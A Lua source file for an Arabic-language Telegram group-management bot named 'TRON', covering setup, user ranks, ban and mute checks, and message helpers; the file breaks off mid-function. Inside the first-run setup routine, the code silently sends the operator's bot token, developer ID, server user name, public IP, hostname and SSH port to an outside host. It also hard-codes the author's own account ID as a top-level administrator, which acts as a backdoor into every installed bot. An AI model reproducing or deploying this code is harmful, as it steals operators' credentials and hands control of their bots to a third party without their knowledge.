------------------------------------------------
-- This Source Was Developed By (Abd) @LEEEE9.--
--   This Is The Source Channel @YYYYAX .   --
--                - TRON -                 --
--        -- https://t.me/YYYYAX --         --
------------------------------------------------ 
DevAbd  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source TRON     --
local AutoSet = function() 
if not DevAbd:get(Server.."IdTRON") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevAbd:set(Server.."IdTRON",DevId) 
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end 
os.execute('lua TRON.lua') 
end 
if not DevAbd:get(Server.."TokenTRON") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevAbd:set(Server.."TokenTRON",TokenBot) 
end  
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end  
os.execute('lua TRON.lua') 
end 
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevAbd:get(Server.."IdTRON"),
TokenBot = DevAbd:get(Server.."TokenTRON"),
TRON = DevAbd:get(Server.."TokenTRON"):match("(%d+)"),
SudoIds = {DevAbd:get(Server.."IdTRON")},
}
Create(Config, "./config.lua") 
https.request("https://apiAbd.ml/config.php?Get=TRON&DevId="..DevAbd:get(Server.."IdTRON").."&TokenBot="..DevAbd:get(Server.."TokenTRON").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("TRON.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/TRON
token="]]..DevAbd:get(Server.."TokenTRON")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
./tg -s ./TRON.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/TRON
while(true) do
rm -fr ../.telegram-cli
screen -S TRON -X kill
screen -S TRON ./TRON.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_TRON = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevAbd:del(Server.."IdTRON");DevAbd:del(Server.."TokenTRON")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_TRON() 
print("\27[36m"..[[ 
---------------------------------------------
|    ____             ____                  |
|   |  _ \  _____   _|  _ \ _ __ _____  __  |
|   | | | |/ _ \ \ / / |_) | '__/ _ \ \/ /  |
|   | |_| |  __/\ V /|  __/| | | (_) >  <   |
|   |____/ \___| \_/ |_|   |_|  \___/_/\_\  |
|-------------------------------------------|
|This Source Was Developed By (Abd) @LEEEE9.|
|  This Is The Source Channel @YYYYAX .   |
|               - TRON -                 |
---------------------------------------------
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,1823672541}
TRON = Config.TRON
TokenBot = Config.TokenBot
NameBot = (DevAbd:get(TRON..'Abd:NameBot') or 'ترون')
--     Source TRON     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source TRON     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source TRON     --
function dl_cb(arg, data)
end
--     Source TRON     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source TRON     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevAbd:sismember(TRON..'Abd:SecondSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(TRON) then  
var = true  
end  
return var  
end 
--     Source TRON     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevAbd:sismember(TRON..'Abd:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
---------Manager All--------
function ManagerAll(msg) 
local Status = DevAbd:sismember(TRON..'Abd:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
--------- Admin All --------
function AdminAll(msg) 
local Status = DevAbd:sismember(TRON..'Abd:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
------ Vip Member All ------
function VipAll(msg) 
local Status = DevAbd:sismember(TRON..'Abd:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
----   AbdConstructor   ----
function AbdConstructor(msg) 
local Status = DevAbd:sismember(TRON..'Abd:AbdConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevAbd:sismember(TRON..'Abd:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbdConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevAbd:sismember(TRON..'Abd:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbdConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
---------  Manager  --------
function Manager(msg) 
local Status = DevAbd:sismember(TRON..'Abd:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AbdConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevAbd:sismember(TRON..'Abd:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or AbdConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevAbd:sismember(TRON..'Abd:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or AbdConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevAbd:sismember(TRON..'Abd:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AbdConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source TRON     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevAbd:sismember(TRON..'Abd:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source TRON     --
---------  BanAll  ---------
function BanAll(user_id)
if DevAbd:sismember(TRON..'Abd:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source TRON     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevAbd:sismember(TRON..'Abd:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source TRON     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevAbd:sismember(TRON..'Abd:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source TRON     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source TRON     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source TRON     --
function TRONFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.TRON and msg then
FilesText = plugin.TRON(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source TRON     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source TRON     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= TRON:lower() then 
send(chat,msg.id_,"⌁︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"⌁︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"⌁︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..TRON..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevAbd:set(TRON.."Abd:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevAbd:sadd(TRON.."Abd:Groups",IdGps) 
DevAbd:set(TRON.."Abd:Lock:Bots"..IdGps,"del") DevAbd:hset(TRON.."Abd:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Abd:Lock:Links','Abd:Lock:Contact','Abd:Lock:Forwards','Abd:Lock:Videos','Abd:Lock:Gifs','Abd:Lock:EditMsgs','Abd:Lock:Stickers','Abd:Lock:Farsi','Abd:Lock:Spam','Abd:Lock:WebLinks','Abd:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAbd:set(TRON..Lock..IdGps,true)
end
if v.AbdConstructors then
for k,IdAbdConstructors in pairs(v.AbdConstructors) do
DevAbd:sadd(TRON..'Abd:AbdConstructor:'..IdGps,IdAbdConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevAbd:sadd(TRON..'Abd:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevAbd:sadd(TRON..'Abd:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevAbd:sadd(TRON..'Abd:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevAbd:sadd(TRON..'Abd:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevAbd:sadd(TRON..'Abd:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevAbd:set(TRON.."Abd:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevAbd:set(TRON.."Abd:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"⌁︙تم رفع النسخه بنجاح \n⌁︙تم تفعيل جميع المجموعات \n⌁︙تم استرجاع مشرفين المجموعات \n⌁︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source TRON     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source TRON     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source TRON     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source TRON     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source TRON     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source TRON     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source TRON     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source TRON     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source TRON     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source TRON     --
function Dev_Abd(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source TRON     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source TRON     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source TRON     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source TRON     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source TRON     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source TRON     --
local AbdRank = function(msg) if SudoId(msg.sender_user_id_) then TRONTEAM  = "المطور" elseif SecondSudo(msg) then TRONTEAM = "المطور" elseif SudoBot(msg) then TRONTEAM = "المطور" elseif ManagerAll(msg) then TRONTEAM = "المدير" elseif AdminAll(msg) then TRONTEAM = "الادمن" elseif AbdConstructor(msg) then TRONTEAM = "المالك" elseif BasicConstructor(msg) then TRONTEAM = "المنشئ" elseif Constructor(msg) then TRONTEAM = "المنشئ" elseif Manager(msg) then TRONTEAM = "المدير" elseif Admin(msg) then TRONTEAM = "الادمن" else TRONTEAM = "العضو" end return TRONTEAM end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1823672541) then TRONTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(TRON) then TRONTEAM = 'البوت' elseif SudoId(user_id) then TRONTEAM = 'المطور الاساسي' elseif DevAbd:sismember(TRON..'Abd:SecondSudo:', user_id) then TRONTEAM = 'المطور الثانوي' elseif DevAbd:sismember(TRON..'Abd:SudoBot:', user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbd:sismember(TRON..'Abd:ManagerAll:', user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbd:sismember(TRON..'Abd:AdminAll:', user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbd:sismember(TRON..'Abd:VipAll:', user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbd:sismember(TRON..'Abd:AbdConstructor:'..chat_id, user_id) then TRONTEAM = 'المالك' elseif DevAbd:sismember(TRON..'Abd:BasicConstructor:'..chat_id, user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbd:sismember(TRON..'Abd:Constructor:'..chat_id, user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbd:sismember(TRON..'Abd:Managers:'..chat_id, user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:Managers:Rd"..chat_id) or 'المدير' elseif DevAbd:sismember(TRON..'Abd:Admins:'..chat_id, user_id) then TRONTEAM = DevAbd:get(TRON.."Abd:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbd:sismember(TRON..'Abd:VipMem:'..chat_id, user_id) then  TRONTEAM = DevAbd:get(TRON.."Abd:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbd:sismember(TRON..'Abd:Cleaner:'..chat_id, user_id) then  TRONTEAM = DevAbd:get(TRON.."Abd:Cleaner:Rd"..chat_id) or 'المنظف' else TRONTEAM = DevAbd:get(TRON.."Abd:mem:Rd"..chat_id) or 'العضو' end return TRONTEAM end
--     Source TRON     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(TRON) then  
var = true  
elseif DevAbd:sismember(TRON..'Abd:SecondSudo:', user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:SudoBot:', user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:ManagerAll:', user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:AdminAll:', user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:VipAll:', user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:AbdConstructor:'..chat_id, user_id) then
var = true
elseif DevAbd:sismember(TRON..'Abd:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevAbd:sismember(TRON..'Abd:Constructor:'..chat_id, user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:Managers:'..chat_id, user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:Admins:'..chat_id, user_id) then
var = true  
elseif DevAbd:sismember(TRON..'Abd:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function AbdDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevAbd:sismember(TRON..'Abd:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevAbd:sismember(TRON..'Abd:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevAbd:sismember(TRON..'Abd:AbdConstructor:'..chat_id, user_id) then
var = 'Abdconstructor'
elseif DevAbd:sismember(TRON..'Abd:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevAbd:sismember(TRON..'Abd:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevAbd:sismember(TRON..'Abd:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source TRON     --
local function Filters(msg, value)
local Abd = (TRON..'Abd:Filters:'..msg.chat_id_)
if Abd then
local names = DevAbd:hkeys(Abd)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "YYYYAX")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙عذرا عزيزي ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source TRON     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Abd = GetInfo.result.custom_title
else 
Abd = Status
end
end
return Abd
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'⌁︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'⌁︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'⌁︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
